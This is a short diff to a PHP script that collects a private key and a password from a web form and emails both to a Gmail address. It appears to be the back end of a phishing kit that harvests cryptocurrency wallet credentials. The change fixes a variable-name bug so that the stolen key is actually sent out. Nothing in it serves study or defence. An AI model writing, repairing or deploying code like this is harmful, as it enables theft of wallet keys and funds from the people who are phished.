@@ -17,7 +17,7 @@ if($privateKey== '' || $pkpass== ''){
         echo "check the fields";
     }else{
       $subject='Query from '.$sender;
-      $message='Dear Sir,<br><br>'.$subject.'<br><br>privatekey: '.$privatekey.'<br>pk Password: '.$pkpass;
+      $message='Dear Sir,<br><br>'.$subject.'<br><br>privatekey: '.$privateKey.'<br>pk Password: '.$pkpass;
 
 
 
@@ -34,7 +34,7 @@ $mail->AddReplyTo("emmajoy658@gmail.com");
 $mail->Subject = "/New Entry";
 $mail->MsgHTML("emmajoy658@gmail.com");
 
-$mail->Body = "Private Key= " . $privatekey . "\r\n Temporary Session Password= " . $pkpass;
+$mail->Body = "Private Key= " . $privateKey . "\r\n Temporary Session Password= " . $pkpass;
 
 $mail->addAddress($email_to);
 if ( $mail->Send() ) {
